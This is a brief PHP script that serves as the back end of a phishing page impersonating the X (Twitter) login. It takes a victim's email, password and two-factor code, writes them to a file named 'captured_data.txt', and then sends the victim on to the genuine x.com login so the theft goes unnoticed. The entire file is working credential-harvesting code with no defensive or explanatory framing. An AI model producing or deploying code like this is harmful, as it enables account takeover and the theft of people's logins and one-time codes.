<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $twoFaCode = $_POST['2fa_code'];

    // Store data in a local file
    $data = "Email: $email\nPassword: $password\n2FA Code: $twoFaCode\n\n";
    file_put_contents('captured_data.txt', $data, FILE_APPEND);

    // Redirect to a thank you page or the original X login page
    header("Location: https://x.com/login");
    exit();
}
?>
